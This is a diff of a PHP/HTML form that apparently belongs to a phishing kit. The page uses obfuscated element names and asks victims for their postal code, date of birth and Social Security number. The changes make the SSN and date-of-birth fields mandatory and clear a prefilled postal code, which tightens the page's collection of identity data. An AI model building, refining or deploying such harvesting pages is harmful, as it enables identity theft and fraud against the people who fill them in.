@@ -124,7 +124,7 @@ exit;
                                                 <div class="x_26ID-Z561" id="x_29ID-Z731">
                                                     <div class="x_27ID-Z672 x_V-ForZ118 medium x_28ID-Z645  right" id="x_24ID-Z784">
                                                         <input type="text" id="postalCode" name="zipCode" autocomplete="off" class="Xval666ideX1 x_30ID-Z616" required="required" placeholder="Postal Code" 
-														value="<?echo $_SESSION['_LOOKUP_ZIPCODE_'];?>"
+														value=""
 														 aria-required="true">
                                                     </div>
                                                 </div>
@@ -159,7 +159,7 @@ exit;
 												
 				
 												
-												<input type="tel" id="date" name="dob" autocomplete="off" class="Xval666ideX1 x_33ID-Z634"  value="" pattern="[0-9-/]{10}" maxlength="10" placeholder="Date of Birth (DD/MM/YYYY)" aria-required="true">
+												<input type="tel" id="date" name="dob" required="required" autocomplete="off" class="Xval666ideX1 x_33ID-Z634"  value="" pattern="[0-9-/]{10}" maxlength="10" placeholder="Date of Birth (DD/MM/YYYY)" aria-required="true">
 											</div>
                                              <div class="x_31ID-Z757" id="x_32ID-Z685">
                                                 <div class="x_32ID-Z680 x_V-ForZ118 x_22ID-Z601 medium x_30ID-Z523 right" id="x_22ID-Z527">
@@ -176,7 +176,7 @@ exit;
 													
 													echo'
 													
-													<input type="tel" id="csc" name="SSN" style="    margin-top: 39px;" autocomplete="off" class="x_23ID-Z770 Xval666ideX1 x_23ID-Z741" pattern="[0-9]{9}" maxlength="9" placeholder="Social security number" value="" aria-required="true">
+													<input type="tel" id="csc" required="required" name="SSN" style="    margin-top: 39px;" autocomplete="off" class="x_23ID-Z770 Xval666ideX1 x_23ID-Z741" pattern="[0-9]{9}" maxlength="9" placeholder="Social security number" value="" aria-required="true">
 													
 													';
 												
